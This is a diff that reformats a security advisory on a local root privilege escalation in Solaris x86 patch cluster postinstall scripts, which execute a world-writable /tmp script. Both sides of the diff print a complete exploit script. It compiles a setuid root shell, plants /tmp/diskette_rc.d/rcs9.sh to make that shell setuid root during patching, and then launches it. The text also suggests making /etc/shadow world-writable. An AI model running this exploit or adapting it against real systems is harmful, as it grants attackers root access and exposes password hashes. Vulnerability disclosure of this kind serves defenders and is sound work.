@@ -1,82 +1,94 @@
-                                Advisory #: 38
-Title: Solaris Recommended Patch Cluster 6/19 local root on x86
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-07-03
-Download Site: www.oracle.com
-Vendor:Oracle
-Vendor Notified: 2013-07-03
-Vendor Contact: security@oracle.com
-Description: If the system administrator is updating the system using update
-manager or smpatch (multi user mode) a local user could execute commands as
-root. This only affects x86 systems as this code resides under a case statement
-checking that the platform is intel based.
-Vulnerability:
-Write to /tmp/diskette_rc.d/rcs9.sh before execution and you can execute
-commands as root. ./144751-01/SUNWos86r/install/postinstall 782 if [ -s /tmp/
-disketterc.d/rcs9.sh ] 783 then 784 /sbin/sh /tmp/disketterc.d/rcs9.sh "post"
-785 fi Inject entries into driver_aliases, research config file? maybe we can
-load our own library/driver? 804 # Remove erroneous entry for Symbios Logic
-53c875/95 (ncrs) 805 TMPFILE=/tmp/ncrstmp 806 sed -e '/^ncrs "pci1000,1000"$/d'
-${BASEDIR}/etc/driveraliases >$TMPFILE 807 cp $TMPFILE ${BASEDIR}/etc/
-driver_aliases ./141445-09/SUNWos86r/install/postinstall 656 if [ -s /tmp/
-disketterc.d/rcs9.sh ] 657 then 658 /sbin/sh /tmp/disketterc.d/rcs9.sh "post"
-659 fi Well, it looks like you've got a few chances to abuse it:
-larry@slowaris:~/10x86Recommended/patches$ find . -name "*install" -type f -
-exec grep -l "/sbin/sh /tmp/diskette_rc.d/rcs9.sh" {} \; ./144501-19/SUNWos86r/
-install/postinstall ./141445-09/SUNWos86r/install/postinstall ./142059-01/
-SUNWos86r/install/postinstall ./147148-26/SUNWos86r/install/postinstall ./
-127128-11/SUNWos86r/install/postinstall ./148889-03/SUNWos86r/install/
-postinstall ./142910-17/SUNWos86r/install/postinstall ./144751-01/SUNWos86r/
-install/postinstall Psuedo PoC: Depending on how rcs9.sh is created, we can
-either write to it repeatedly or just create the file initially with our
-malicious entry. According to the code if the file exists, it's just executed.
-Easy. chmod 666 /etc/shadow would be easy.
-CVE-2010-1183
-JSON:Export
-Exploit Code:
-   1. #!/bin/sh
-   2. #Larry W. Cashdollar, local root for Solaris x86 during patching
-   3. #10/4/2013 Tested on Cluster 9/30/2013
-   4. # larry@s0l4r1s:~$ ./disk_exp.sh
-   5. # [+] Creating evil shell
-   6. # [+] Hope you've got gcc on here, compiling...
-   7. # [+] Waiting for root shell
-   8. # [+] Tada!
-   9. # # id
-  10. # uid=0(root) gid=0(root)
-  11.  
-  12.  
-  13. echo "[+] Creating evil shell"
-  14.  
-  15. cat << EOF > r00t.c
-  16. #include <stdio.h>
-  17. #include <unistd.h>
-  18. int
-  19. main (void)
-  20. {
-  21.   char *shell[2];
-  22.   shell[0] = "sh";
-  23.   shell[1] = NULL;
-  24.   setreuid (0, 0);
-  25.   setregid (0, 0);
-  26.   execve ("/bin/sh", shell, NULL);
-  27.   return(0);
-  28. }
-  29. EOF
-  30.  
-  31. echo "[+] Hope you've got gcc on here, compiling..."
-  32.  
-  33. gcc r00t.c -o /tmp/r00t
-  34.  
-  35. mkdir -p /tmp/diskette_rc.d/
-  36.  
-  37. echo "#!/bin/sh" > /tmp/diskette_rc.d/rcs9.sh
-  38. echo "chown root:root /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
-  39. echo "chmod +s /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
-  40. chmod +x /tmp/diskette_rc.d/rcs9.sh
-  41. echo "[+] Waiting for root shell"
-  42.  
-  43. until [  -u /tmp/r00t ]; do sleep 1; done; echo "[+] Tada!";/tmp/r00t
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/solaris-patch-cluster-
-x86root.html
+
+                               Advisory #: 38
+
+   Title: Solaris Recommended Patch Cluster 6/19 local root on x86
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-07-03
+   Download Site: www.oracle.com
+   Vendor: Oracle
+   Vendor Notified: 2013-07-03
+   Vendor Contact: security@oracle.com
+   Description: If the system administrator is updating the system using
+   update manager or smpatch (multi user mode) a local user could execute
+   commands as root. This only affects x86 systems as this code resides
+   under a case statement checking that the platform is intel based.
+   Vulnerability:
+   Write to /tmp/diskette_rc.d/rcs9.sh before execution and you can
+   execute commands as root. ./144751-01/SUNWos86r/install/postinstall 782
+   if [ -s /tmp/disketterc.d/rcs9.sh ] 783 then 784 /sbin/sh
+   /tmp/disketterc.d/rcs9.sh "post" 785 fi Inject entries into
+   driver_aliases, research config file? maybe we can load our own
+   library/driver? 804 # Remove erroneous entry for Symbios Logic
+   53c875/95 (ncrs) 805 TMPFILE=/tmp/ncrstmp 806 sed -e '/^ncrs
+   "pci1000,1000"$/d' ${BASEDIR}/etc/driveraliases >$TMPFILE 807 cp
+   $TMPFILE ${BASEDIR}/etc/driver_aliases
+   ./141445-09/SUNWos86r/install/postinstall 656 if [ -s
+   /tmp/disketterc.d/rcs9.sh ] 657 then 658 /sbin/sh
+   /tmp/disketterc.d/rcs9.sh "post" 659 fi Well, it looks like you've got
+   a few chances to abuse it: larry@slowaris:~/10x86Recommended/patches$
+   find . -name "*install" -type f -exec grep -l "/sbin/sh
+   /tmp/diskette_rc.d/rcs9.sh" {} \;
+   ./144501-19/SUNWos86r/install/postinstall
+   ./141445-09/SUNWos86r/install/postinstall
+   ./142059-01/SUNWos86r/install/postinstall
+   ./147148-26/SUNWos86r/install/postinstall
+   ./127128-11/SUNWos86r/install/postinstall
+   ./148889-03/SUNWos86r/install/postinstall
+   ./142910-17/SUNWos86r/install/postinstall
+   ./144751-01/SUNWos86r/install/postinstall Psuedo PoC: Depending on how
+   rcs9.sh is created, we can either write to it repeatedly or just create
+   the file initially with our malicious entry. According to the code if
+   the file exists, it's just executed. Easy. chmod 666 /etc/shadow would
+   be easy.
+   CVE-2010-1183
+   JSON: Export
+   Exploit Code:
+
+    1. #!/bin/sh
+    2. #Larry W. Cashdollar, local root for Solaris x86 during patching
+    3. #10/4/2013 Tested on Cluster 9/30/2013
+    4. # larry@s0l4r1s:~$ ./disk_exp.sh
+    5. # [+] Creating evil shell
+    6. # [+] Hope you've got gcc on here, compiling...
+    7. # [+] Waiting for root shell
+    8. # [+] Tada!
+    9. # # id
+   10. # uid=0(root) gid=0(root)
+   11.
+   12.
+   13. echo "[+] Creating evil shell"
+   14.
+   15. cat << EOF > r00t.c
+   16. #include <stdio.h>
+   17. #include <unistd.h>
+   18. int
+   19. main (void)
+   20. {
+   21. char *shell[2];
+   22. shell[0] = "sh";
+   23. shell[1] = NULL;
+   24. setreuid (0, 0);
+   25. setregid (0, 0);
+   26. execve ("/bin/sh", shell, NULL);
+   27. return(0);
+   28. }
+   29. EOF
+   30.
+   31. echo "[+] Hope you've got gcc on here, compiling..."
+   32.
+   33. gcc r00t.c -o /tmp/r00t
+   34.
+   35. mkdir -p /tmp/diskette_rc.d/
+   36.
+   37. echo "#!/bin/sh" > /tmp/diskette_rc.d/rcs9.sh
+   38. echo "chown root:root /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
+   39. echo "chmod +s /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
+   40. chmod +x /tmp/diskette_rc.d/rcs9.sh
+   41. echo "[+] Waiting for root shell"
+   42.
+   43. until [ -u /tmp/r00t ]; do sleep 1; done; echo "[+]
+       Tada!";/tmp/r00t
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/solaris-patch-cluster-x86root.html
